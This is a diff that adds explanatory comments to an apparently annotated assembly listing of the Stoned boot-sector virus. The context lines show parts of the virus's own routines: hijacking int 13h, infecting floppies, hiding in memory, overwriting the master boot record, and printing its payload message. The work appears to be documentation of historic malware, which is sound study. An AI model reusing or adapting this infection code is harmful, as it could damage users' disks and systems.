@@ -43,7 +43,7 @@ virus_int_13h:
 
       xor ax,ax
       mov ds,ax
-      mov al,[0x43f]         ; bios: drive running
+      mov al,[0x43f]         ; bios: diskette motor status
       test al,0x1            ; floppy drive motors active?
       jnz return_to_int_13h
       call word prepare_floppy_infection
@@ -155,7 +155,7 @@ decrease_available_memory:
       mov cl,0x6                            ; set ES to the virus segment (hole address; convert
       shl ax,cl                             ; from KiB to segments).
       mov es,ax
-      mov [0x7c0f],ax
+      mov [0x7c0f],ax                       ; update segment part of v_boot_entry far pointer
 
       mov ax,0x15                           ; hijack int 13h
       mov [0x13*4],ax
@@ -275,7 +275,7 @@ backup_mbr:
     pop es
     mov si,(r_boot_sector_buffer-boot_entry)+(partition_table-boot_entry)
     mov di,partition_table-boot_entry                 ; copy the partition table, plus other 512 bytes,
-    mov cx,0x400-(partition_table-boot_entry)         ; assuming that a disk sector is 1K.
+    mov cx,0x400-(partition_table-boot_entry)         ; assuming that a disk sector is 1K (standard is 512 bytes; likely a bug)
     rep movsb
 
     mov ax,0x301     ; write, one sector
@@ -284,7 +284,7 @@ backup_mbr:
     int 0x13
     jmp resume_original_boot
 
-payload_message: db 7h, 'Your PC is now Ston', 90h, 'd!', 07h, 0Dh, 0Ah, 0Ah, 0
+payload_message: db 7h, 'Your PC is now Ston', 90h, 'd!', 07h, 0Dh, 0Ah, 0Ah, 0 ; 90h='É' substitutes 'e' in "Stoned"
 hidden_message:  db 'LEGALISE MARIJUANA!'
 
 memory_buffer:
